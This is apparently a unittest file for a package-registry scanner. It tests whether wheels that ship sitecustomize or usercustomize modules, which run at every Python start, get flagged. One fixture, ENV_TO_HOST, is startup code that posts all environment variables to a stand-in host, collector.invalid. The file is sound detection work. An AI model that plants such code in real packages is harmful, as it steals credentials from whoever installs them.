"""A wheel's sitecustomize / usercustomize modules run at every Python start.

A wheel's top level, and its <name>.data/purelib and platlib directories,
are installed into site-packages. site.py imports `sitecustomize` from there
whenever the interpreter starts (and `usercustomize` when the user site is
enabled), whether or not the package is ever imported: the vector of a .pth
file. The registry treated them as ordinary modules. They are SC-SITECUSTOMIZE
now: MAJOR (WARN) as a capability, CRITICAL when install_script_risk says
the code sends the environment or credentials off, contacts an exfiltration
service or pipes a download into a shell.

Payloads are inert: the collector is a .invalid host.
"""

import unittest

from tests.registry._review_support import issues, scan_sdist, scan_wheel

META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n", "x/__init__.py": ""}
HARMLESS = "import os\nos.environ.setdefault('X_MODE', 'fast')\n"
ENV_TO_HOST = ("import os, json\nimport urllib.request\n"
               "urllib.request.urlopen('https://collector.invalid/c', "
               "data=json.dumps(dict(os.environ)).encode())\n")


def startup(res):
    return [(i["file"], i["sev"]) for i in issues(res, "SC-SITECUSTOMIZE")]


class StartupModuleTests(unittest.TestCase):
    def test_top_level_and_data_dirs(self):
        for rel in ("sitecustomize.py", "usercustomize.py", "sitecustomize/__init__.py",
                    "x-1.0.data/purelib/sitecustomize.py", "x-1.0.data/platlib/usercustomize.py"):
            with self.subTest(rel=rel):
                res = scan_wheel({**META, rel: HARMLESS})
                self.assertEqual(startup(res), [(rel, "MAJOR")])
                self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
                self.assertIn("at every start", issues(res, "SC-SITECUSTOMIZE")[0]["msg"])

    def test_hostile_start_up_code_is_critical(self):
        res = scan_wheel({**META, "sitecustomize.py": ENV_TO_HOST})
        self.assertEqual(startup(res), [("sitecustomize.py", "CRITICAL")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertIn("sends environment variables over the network", issues(res, "SC-SITECUSTOMIZE")[0]["msg"])

    def test_modules_that_are_not_installed_at_the_top(self):
        for rel in ("x/sitecustomize.py", "x-1.0.data/scripts/sitecustomize.py",
                    "x-1.0.data/data/usercustomize.py", "sitecustomize_helpers.py"):
            with self.subTest(rel=rel):
                res = scan_wheel({**META, rel: HARMLESS})
                self.assertEqual(startup(res), [])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_only_wheels_install_them_as_is(self):
        res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x')\n",
                          "sitecustomize.py": HARMLESS})
        self.assertEqual(startup(res), [])


if __name__ == "__main__":
    unittest.main()
